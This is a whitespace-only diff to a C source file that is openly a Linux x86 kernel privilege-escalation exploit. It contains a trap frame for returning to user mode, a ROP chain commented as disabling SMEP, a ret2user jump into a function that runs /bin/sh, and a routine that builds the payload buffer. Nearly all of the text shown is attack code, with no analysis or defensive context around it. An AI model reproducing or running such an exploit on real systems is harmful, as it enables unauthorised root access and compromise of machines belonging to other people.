@@ -9,9 +9,9 @@
 #include <fcntl.h>
 #include <stdint.h>
      
-    struct trap_frame tf;
+struct trap_frame tf;
      
-    struct trap_frame {
+struct trap_frame {
       void*     eip;      /* instruction pointer */
       uint32_t  cs;       /* code segment */
       uint32_t  eflags;   /* CPU flags */
@@ -19,11 +19,11 @@
       uint32_t  ss;       /* stack segment */
     } __attribute__((packed));
      
-    void launch_shell(void) {
+void launch_shell(void) {
       execl("/bin/sh", "sh", NULL);
     }
      
-    uintptr_t ropchain[] = {
+uintptr_t ropchain[] = {
     /*
         // disable smep
         0xc12b4a73,     // pop edx ; pop eax ; pop ebx ; ret
@@ -49,7 +49,7 @@
         (uintptr_t)&launch_shell /* ret2user */
       };
      
-    void build_rop(uint16_t base) {
+void build_rop(uint16_t base) {
         uint8_t buf[1024];
         uint8_t *ptr = buf;
         char *rp = (char*)ropchain;
@@ -67,7 +67,7 @@
         fclose(fd);
     }
      
-    void prepare_tf(void) {
+void prepare_tf(void) {
       __asm(
           "pushl %cs;   popl tf+4;"
           "pushfl;      popl tf+8;"
@@ -78,7 +78,7 @@
     }
      
      
-    int main() {
+int main() {
       fprintf(stdout, "\n[*] Backing up stack state...\n");
       prepare_tf();
      
